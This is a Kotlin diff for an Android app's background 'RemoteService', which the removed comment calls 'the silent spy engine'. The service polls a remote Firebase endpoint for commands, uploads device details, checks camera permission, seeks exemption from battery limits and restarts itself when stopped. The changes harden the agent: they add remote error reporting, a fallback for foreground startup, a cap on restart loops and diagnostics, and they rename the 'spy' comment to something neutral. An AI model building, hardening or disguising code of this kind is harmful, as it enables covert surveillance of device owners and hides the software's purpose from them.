@@ -181,7 +181,7 @@ fun locJson(ctx: Context): JSONObject {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  REMOTE AGENT SERVICE — the silent spy engine (crash-guarded)
+//  REMOTE AGENT SERVICE — crash-guarded + self-reporting
 // ═══════════════════════════════════════════════════════════════════════
 class RemoteService : Service() {
 
@@ -190,15 +190,36 @@ class RemoteService : Service() {
     private var lastCmdId = ""
     private var loop = 0
 
+    companion object {
+        var alive = false
+        var lastErr = ""
+        var lastPut = 0L
+    }
+
     private val poller = object : Runnable {
         override fun run() {
-            try { work() } catch (_: Exception) { }
+            try { work() } catch (e: Exception) { lastErr = "work:" + (e.message ?: e.javaClass.simpleName) }
             handler?.postDelayed(this, 12000)
         }
     }
 
+    private fun reportErrAsync() {
+        try {
+            val dev = deviceIdOf(this)
+            val url = "$FB_URL/r/$FB_SECRET/devices/$dev/info.json"
+            val o = JSONObject()
+            o.put("lastSeen", 0)
+            o.put("online", false)
+            o.put("err", lastErr)
+            o.put("model", Build.MODEL)
+            o.put("sdk", Build.VERSION.SDK_INT)
+            Thread { httpPut(url, o.toString()) }.start()
+        } catch (_: Exception) { }
+    }
+
     override fun onCreate() {
         super.onCreate()
+        alive = true
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         if (Build.VERSION.SDK_INT >= 26) {
             val ch = NotificationChannel("agent_chan", "Remote Agent", NotificationManager.IMPORTANCE_LOW)
@@ -215,6 +236,7 @@ class RemoteService : Service() {
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setOngoing(true)
 
+        var started = false
         try {
             if (Build.VERSION.SDK_INT >= 34) {
                 var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
@@ -229,10 +251,22 @@ class RemoteService : Service() {
                     types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                 }
                 startForeground(9001, nb.build(), types)
-            } else {
-                startForeground(9001, nb.build())
+                started = true
             }
         } catch (e: Exception) {
+            lastErr = "FG1:" + (e.message ?: e.javaClass.simpleName)
+        }
+        if (!started) {
+            try {
+                startForeground(9001, nb.build())
+                started = true
+            } catch (e: Exception) {
+                lastErr = (if (lastErr.isEmpty()) "" else "$lastErr | ") + "FG2:" + (e.message ?: e.javaClass.simpleName)
+            }
+        }
+        if (!started) {
+            alive = false
+            reportErrAsync()
             stopSelf()
             return
         }
@@ -250,11 +284,18 @@ class RemoteService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        alive = false
         handler?.removeCallbacks(poller)
         thread?.quitSafely()
+        val p = getSharedPreferences(NPREF, MODE_PRIVATE)
+        val fails = p.getInt("agentFails", 0)
         try {
-            if (canStartAgent(this)) {
+            if (canStartAgent(this) && fails < 8) {
+                p.edit().putInt("agentFails", fails + 1).apply()
                 ContextCompat.startForegroundService(this, Intent(this, RemoteService::class.java))
+            } else if (fails >= 8) {
+                lastErr = (if (lastErr.isEmpty()) "" else "$lastErr | ") + "loop-stop after $fails fails"
+                reportErrAsync()
             }
         } catch (_: Exception) { }
         super.onDestroy()
@@ -272,7 +313,14 @@ class RemoteService : Service() {
         info.put("model", Build.MODEL)
         info.put("sdk", Build.VERSION.SDK_INT)
         info.put("online", true)
-        httpPut("$b/info.json", info.toString())
+        info.put("err", lastErr)
+        val ok = httpPut("$b/info.json", info.toString())
+        if (ok) {
+            lastPut = System.currentTimeMillis()
+            getSharedPreferences(NPREF, MODE_PRIVATE).edit().putInt("agentFails", 0).apply()
+        } else {
+            lastErr = "put-fail"
+        }
 
         loop++
         if (loop % 25 == 0) {
@@ -850,6 +898,16 @@ class MainActivity : FlutterActivity() {
                     "deviceId" -> {
                         result.success(deviceIdOf(this))
                     }
+                    "agentDiag" -> {
+                        val m = HashMap<String, Any>()
+                        m["agent"] = getSharedPreferences(NPREF, MODE_PRIVATE).getBoolean("agent", false)
+                        m["cam"] = permGranted(this, Manifest.permission.CAMERA)
+                        m["alive"] = RemoteService.alive
+                        m["err"] = RemoteService.lastErr
+                        m["lastPut"] = RemoteService.lastPut
+                        m["fails"] = getSharedPreferences(NPREF, MODE_PRIVATE).getInt("agentFails", 0)
+                        result.success(m)
+                    }
                     "compress" -> {
                         val bytes = call.argument<ByteArray>("bytes") ?: ByteArray(0)
                         val maxKB = call.argument<Int>("maxKB") ?: 1024
@@ -932,7 +990,7 @@ class MainActivity : FlutterActivity() {
                         }
                     }
                     "agentOn" -> {
-                        getSharedPreferences(NPREF, MODE_PRIVATE).edit().putBoolean("agent", true).apply()
+                        getSharedPreferences(NPREF, MODE_PRIVATE).edit().putBoolean("agent", true).putInt("agentFails", 0).apply()
                         try {
                             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
